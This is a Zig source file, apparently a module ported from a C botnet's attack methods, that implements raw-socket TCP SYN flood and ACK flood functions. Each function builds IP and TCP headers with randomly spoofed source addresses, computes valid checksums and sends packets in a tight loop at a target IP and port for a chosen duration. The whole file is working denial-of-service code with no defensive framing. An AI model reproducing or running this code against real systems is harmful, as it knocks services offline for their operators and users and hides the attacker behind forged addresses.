//! # TCP SYN/ACK Attack Methods
//!
//! Raw socket TCP SYN and ACK floods.
//!
//! ## C Reference: modules/attack/methods/syn.c, ack.c

const std = @import("std");
const posix = std.posix;
const crypto = @import("../crypto/mod.zig");

// ============================================================
// RAW SOCKET CONSTANTS
// ============================================================

const IPPROTO_TCP: u8 = 6;
const IPPROTO_RAW: u8 = 255;

// ============================================================
// IP HEADER
// ============================================================

const IpHeader = packed struct {
    version_ihl: u8, // Version (4 bits) + IHL (4 bits)
    tos: u8,
    tot_len: u16,
    id: u16,
    frag_off: u16,
    ttl: u8,
    protocol: u8,
    check: u16,
    saddr: u32,
    daddr: u32,
};

// ============================================================
// TCP HEADER
// ============================================================

const TcpHeader = packed struct {
    source: u16,
    dest: u16,
    seq: u32,
    ack_seq: u32,
    doff_flags: u16, // Data offset (4 bits) + Reserved (6 bits) + Flags (6 bits)
    window: u16,
    check: u16,
    urg_ptr: u16,

    pub fn setFlags(self: *TcpHeader, syn: bool, ack: bool, psh: bool) void {
        var flags: u16 = 0x5000; // Data offset = 5 (20 bytes)
        if (syn) flags |= 0x0002;
        if (ack) flags |= 0x0010;
        if (psh) flags |= 0x0008;
        self.doff_flags = std.mem.nativeToBig(u16, flags);
    }
};

// ============================================================
// TCP PSEUDO HEADER (for checksum)
// ============================================================

const TcpPseudoHeader = packed struct {
    saddr: u32,
    daddr: u32,
    zero: u8,
    protocol: u8,
    tcp_len: u16,
};

// ============================================================
// TCP SYN FLOOD (from C: syn.c attack_tcp_syn)
// ============================================================

pub fn attackTcpSyn(ip: u32, port: u16, duration: u32) void {
    // Create raw socket
    const sock = posix.socket(posix.AF.INET, posix.SOCK.RAW, IPPROTO_RAW) catch return;
    defer posix.close(sock);

    // IP_HDRINCL
    // IP_HDRINCL = 3 on Linux
    const one: i32 = 1;
    const IP_HDRINCL = 3;
    posix.setsockopt(sock, posix.IPPROTO.IP, IP_HDRINCL, std.mem.asBytes(&one)) catch {};

    var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

    const end_time = std.time.timestamp() + duration;

    while (std.time.timestamp() < end_time) {
        var packet: [40]u8 = undefined; // IP (20) + TCP (20)

        // Build IP header
        const iph = @as(*IpHeader, @ptrCast(@alignCast(&packet)));
        iph.version_ihl = 0x45; // IPv4, IHL=5
        iph.tos = 0;
        iph.tot_len = std.mem.nativeToBig(u16, 40);
        iph.id = @truncate(rng.next());
        iph.frag_off = 0;
        iph.ttl = 64;
        iph.protocol = IPPROTO_TCP;
        iph.check = 0;
        iph.saddr = std.mem.nativeToBig(u32, rng.next()); // Random source IP (spoofed)
        iph.daddr = std.mem.nativeToBig(u32, ip);

        // Build TCP header
        const tcph = @as(*TcpHeader, @ptrCast(@alignCast(packet[20..].ptr)));
        tcph.source = std.mem.nativeToBig(u16, @as(u16, @truncate(rng.next() | 1024)));
        tcph.dest = std.mem.nativeToBig(u16, port);
        tcph.seq = rng.next();
        tcph.ack_seq = 0;
        tcph.setFlags(true, false, false); // SYN
        tcph.window = std.mem.nativeToBig(u16, 65535);
        tcph.check = 0;
        tcph.urg_ptr = 0;

        // Calculate TCP checksum with pseudo header
        tcph.check = calculateTcpChecksum(iph.saddr, iph.daddr, packet[20..40]);

        // Send
        var dest: posix.sockaddr.in = .{
            .family = posix.AF.INET,
            .port = 0,
            .addr = ip,
        };

        _ = posix.sendto(sock, &packet, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
    }
}

// ============================================================
// TCP ACK FLOOD (from C: ack.c attack_tcp_ack)
// ============================================================

pub fn attackTcpAck(ip: u32, port: u16, duration: u32) void {
    const sock = posix.socket(posix.AF.INET, posix.SOCK.RAW, IPPROTO_RAW) catch return;
    defer posix.close(sock);

    const one: i32 = 1;
    const IP_HDRINCL = 3;
    posix.setsockopt(sock, posix.IPPROTO.IP, IP_HDRINCL, std.mem.asBytes(&one)) catch {};

    var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

    const end_time = std.time.timestamp() + duration;

    while (std.time.timestamp() < end_time) {
        var packet: [40]u8 = undefined;

        const iph = @as(*IpHeader, @ptrCast(@alignCast(&packet)));
        iph.version_ihl = 0x45;
        iph.tos = 0;
        iph.tot_len = std.mem.nativeToBig(u16, 40);
        iph.id = @truncate(rng.next());
        iph.frag_off = 0;
        iph.ttl = 64;
        iph.protocol = IPPROTO_TCP;
        iph.check = 0;
        iph.saddr = std.mem.nativeToBig(u32, rng.next());
        iph.daddr = std.mem.nativeToBig(u32, ip);

        const tcph = @as(*TcpHeader, @ptrCast(@alignCast(packet[20..].ptr)));
        tcph.source = std.mem.nativeToBig(u16, @as(u16, @truncate(rng.next() | 1024)));
        tcph.dest = std.mem.nativeToBig(u16, port);
        tcph.seq = rng.next();
        tcph.ack_seq = rng.next();
        tcph.setFlags(false, true, false); // ACK
        tcph.window = std.mem.nativeToBig(u16, 65535);
        tcph.check = 0;
        tcph.urg_ptr = 0;

        tcph.check = calculateTcpChecksum(iph.saddr, iph.daddr, packet[20..40]);

        var dest: posix.sockaddr.in = .{
            .family = posix.AF.INET,
            .port = 0,
            .addr = ip,
        };

        _ = posix.sendto(sock, &packet, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
    }
}

// ============================================================
// TCP CHECKSUM CALCULATION
// ============================================================

fn calculateTcpChecksum(saddr: u32, daddr: u32, tcp_segment: []const u8) u16 {
    var sum: u32 = 0;

    // Pseudo header
    sum += (saddr >> 16) & 0xFFFF;
    sum += saddr & 0xFFFF;
    sum += (daddr >> 16) & 0xFFFF;
    sum += daddr & 0xFFFF;
    sum += IPPROTO_TCP;
    sum += @as(u16, @intCast(tcp_segment.len));

    // TCP segment
    var i: usize = 0;
    while (i + 1 < tcp_segment.len) : (i += 2) {
        sum += @as(u16, tcp_segment[i]) << 8 | tcp_segment[i + 1];
    }
    if (i < tcp_segment.len) {
        sum += @as(u16, tcp_segment[i]) << 8;
    }

    // Fold
    while (sum >> 16 != 0) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return ~@as(u16, @truncate(sum));
}
